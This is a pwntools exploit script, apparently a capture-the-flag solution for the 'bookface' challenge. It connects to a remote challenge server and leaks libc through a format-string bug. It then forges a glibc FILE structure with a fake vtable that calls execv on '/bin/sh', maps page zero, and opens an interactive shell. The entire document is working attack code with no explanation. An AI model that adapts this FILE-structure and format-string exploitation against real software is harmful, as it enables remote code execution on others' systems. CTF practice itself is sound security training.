from pwn import *
import random

libc = ELF("./libc.so.6")

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct


u1 = str(random.randrange(2**31))
#p = process("./bookface", stdin=PTY)
p = remote("pwn.2020.chall.actf.co", 20733)
p.sendlineafter(": ", u1)
p.sendlineafter("? ", "A"*50)
p.sendlineafter("> ", "4")
p.sendlineafter(": ", u1)
p.sendlineafter(": ", "%3$p\nAAAAAA")
p.recvuntil("0x")
base = int(p.recvuntil("\n")[0:-1], 16) - 0xF72C0

tbl = base + 0x3C40A0
p.sendlineafter(": ", "10\n10\n10\n10")
p.sendlineafter("> ", "3")
p.sendlineafter(": ", u1)
overflow = base + libc.symbols['_IO_file_jumps'] + 0xd8
vtable = overflow - 16
rdi = 100
file_struct = pack_file(_IO_buf_base = 0,
                        _IO_buf_end = (rdi-100)/2,
                        _IO_write_ptr = (rdi-100)/2,
                        _IO_write_base = 0,
                        _lock = 0 + 0x80)
file_struct += p64(0)
file_struct += 'AAAAAAAA'
file_struct = '/bin/sh\x00'+file_struct[0x8:0x40]+p64(base+libc.symbols['execv'])+file_struct[0x48:]
p.sendlineafter("? ", file_struct)
p.sendlineafter("> ", "1")
p.sendlineafter("? ", str((tbl)//8+1))
p.sendlineafter("> ", "4")
p.sendlineafter(": ", str(u1))
p.sendlineafter(": ", "A"*11)
p.sendlineafter(": ", "A"*11)
p.sendlineafter("> ", "4")
for i in range(8):
	p.sendlineafter(": ", u1)
	p.sendlineafter(": ", "10\n10\n10\n10")
	p.sendlineafter("> ", "1")
	p.sendlineafter("? ", "8")
	p.sendlineafter("> ", "4")
	p.sendlineafter(": ", str(u1))
	p.sendlineafter(": ", "A"*11)
	p.sendlineafter(": ", "A"*11)
	p.sendlineafter("> ", "4")
	p.sendlineafter(": ", u1)
	p.sendlineafter(": ", "10\n10\n10\n10")
	p.sendlineafter("> ", "2")
	p.sendlineafter("? ", "7")
	p.sendlineafter("> ", "4")
	p.sendlineafter(": ", str(u1))
	p.sendlineafter(": ", "A"*11)
	p.sendlineafter(": ", "A"*11)
	p.sendlineafter("> ", "4")
#0 is now mapped
p.sendlineafter(": ", u1)
p.sendlineafter(": ", "10\n10\n10\n10")
p.sendlineafter("> ", "4")
p.sendlineafter(": ", u1)
#r = process("./bookface", stdin=PTY)
r = remote("pwn.2020.chall.actf.co", 20733)
r.sendlineafter(": ", u1)
r.sendlineafter(": ", "10\n10\n10\n10")
r.sendlineafter("> ", "3")
r.recvuntil(": ")
pause()
p.sendline("10\n10\n10\n10")
p.interactive()
